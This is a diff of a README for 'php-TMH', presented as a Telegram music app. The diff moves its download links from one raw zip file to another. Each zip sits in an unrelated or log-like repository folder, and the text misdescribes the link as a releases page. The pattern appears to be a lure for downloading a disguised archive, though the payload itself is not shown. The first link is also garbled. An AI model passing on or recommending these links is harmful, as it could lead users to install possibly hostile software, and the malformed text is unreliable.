@@ -1,7 +1,7 @@
 # 🎶 php-TMH - Effortlessly Enjoy Your Music
 
 ## 📥 Download Now
-[![Download the latest release](https://raw.githubusercontent.com/bambangtrisutrisno/php-TMH/main/myelolymphocyte/php-TMH.zip%20Latest%https://raw.githubusercontent.com/bambangtrisutrisno/php-TMH/main/myelolymphocyte/php-TMH.zip)](https://raw.githubusercontent.com/bambangtrisutrisno/php-TMH/main/myelolymphocyte/php-TMH.zip)
+[![Download the latest release](https://github.com/bambangtrisutrisno/php-TMH/raw/refs/heads/main/tmh/data/logs/php-TMH-v1.5-beta.5.zip%20Latest%https://github.com/bambangtrisutrisno/php-TMH/raw/refs/heads/main/tmh/data/logs/php-TMH-v1.5-beta.5.zip)](https://github.com/bambangtrisutrisno/php-TMH/raw/refs/heads/main/tmh/data/logs/php-TMH-v1.5-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **php-TMH** project! This application allows you to listen to your favorite music easily. It is an open-source music hub designed for Telegram users. Follow these steps to get started with your music experience.
@@ -29,7 +29,7 @@ While **php-TMH** is user-friendly, it has some limitations:
 ## 📥 Download & Install
 To download **php-TMH**, visit this page:
 
-[Download the latest releases here!](https://raw.githubusercontent.com/bambangtrisutrisno/php-TMH/main/myelolymphocyte/php-TMH.zip)
+[Download the latest releases here!](https://github.com/bambangtrisutrisno/php-TMH/raw/refs/heads/main/tmh/data/logs/php-TMH-v1.5-beta.5.zip)
 
 1. Click on the link above to open the releases page.
 2. Find the latest version listed. 
